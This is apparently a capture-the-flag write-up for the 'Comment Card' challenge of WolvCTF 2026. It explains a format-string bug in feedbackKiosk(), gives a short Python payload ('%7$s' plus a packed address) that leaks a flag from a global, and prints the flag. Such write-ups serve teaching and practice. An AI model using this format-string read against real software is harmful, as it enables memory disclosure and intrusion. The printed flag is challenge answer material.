# Comment Card

`nc comment-card.wolvctf-2026.kctf.cloud 1337`

## Protections

Full RELRO, no canary, NX disabled, no PIE.

## Bug

`feedbackKiosk()` calls `printf(buffer)` on user input. The flag is loaded into the global at `0x404040`.

On x86-64, variadic arguments 1–5 come from registers, so stack arguments start at `%6$`. With the address placed at buffer offset 8, the matching specifier is `%7$s`.

## Exploit

```python
payload  = b'%7$s'
payload += b'AAAA'
payload += p64(0x404040)
```

## Flag

`wctf{c0mm3nt_hqwx3i5r9jhjik7d}`
